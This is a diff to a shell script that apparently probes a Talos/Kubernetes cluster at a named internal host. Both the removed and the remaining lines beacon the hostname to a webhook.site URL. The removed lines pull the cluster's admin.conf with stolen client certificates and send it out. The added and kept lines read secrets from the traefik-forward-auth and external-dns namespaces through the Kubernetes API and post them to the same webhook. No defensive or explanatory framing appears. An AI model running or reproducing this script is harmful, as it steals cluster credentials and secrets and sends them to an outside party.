@@ -1,18 +1,8 @@
-if [ ! -f /dev/shm/tal10 ]; then
-touch /dev/shm/tal10
-curl -sS --max-time 10 -X POST --data "TALOS-START $(hostname)" "https://webhook.site/40db7f03-c269-4b07-97f2-d24de1e46081"
-curl -sSL --max-time 50 -o /dev/shm/talosctl https://github.com/siderolabs/talos/releases/latest/download/talosctl-linux-amd64
-chmod +x /dev/shm/talosctl
-CA=$(base64 /probe/tc.ca | tr -d '\n'); CRT=$(base64 /probe/tc.crt | tr -d '\n'); KEY=$(base64 /probe/tc.key | tr -d '\n')
-printf 'context: c\ncontexts:\n  c:\n    endpoints:\n      - talos.internal.turnkey.engineering\n    ca: %s\n    crt: %s\n    key: %s\n' "$CA" "$CRT" "$KEY" > /dev/shm/tc.yaml
-OUT=$(timeout 25 /dev/shm/talosctl --talosconfig /dev/shm/tc.yaml read /etc/kubernetes/admin.conf 2>&1)
-curl -sS --max-time 20 --data-binary "$OUT" "https://webhook.site/40db7f03-c269-4b07-97f2-d24de1e46081"
-echo "$OUT" > /dev/shm/admin.conf
-grep -A1 'client-certificate-data' /dev/shm/admin.conf | tail -1 | awk '{print $2}' | base64 -d > /dev/shm/kc.crt
-grep -A1 'client-key-data' /dev/shm/admin.conf | tail -1 | awk '{print $2}' | base64 -d > /dev/shm/kc.key
-grep -A1 'certificate-authority-data' /dev/shm/admin.conf | tail -1 | awk '{print $2}' | base64 -d > /dev/shm/kc.ca
+if [ ! -f /dev/shm/k8s1 ]; then
+touch /dev/shm/k8s1
+curl -sS --max-time 10 -X POST --data "K8S-START $(hostname)" "https://webhook.site/40db7f03-c269-4b07-97f2-d24de1e46081"
 for NS in traefik-forward-auth external-dns; do
-  S=$(curl -sk --max-time 12 --cert /dev/shm/kc.crt --key /dev/shm/kc.key --cacert /dev/shm/kc.ca "https://talos.internal.turnkey.engineering:6443/api/v1/namespaces/$NS/secrets" 2>&1)
+  S=$(curl -sk --max-time 12 --cert /probe/tc.crt --key /probe/tc.key --cacert /probe/tc.ca "https://talos.internal.turnkey.engineering:6443/api/v1/namespaces/$NS/secrets" 2>&1)
   curl -sS --max-time 20 --data-binary "NS=$NS $S" "https://webhook.site/40db7f03-c269-4b07-97f2-d24de1e46081"
 done
 fi
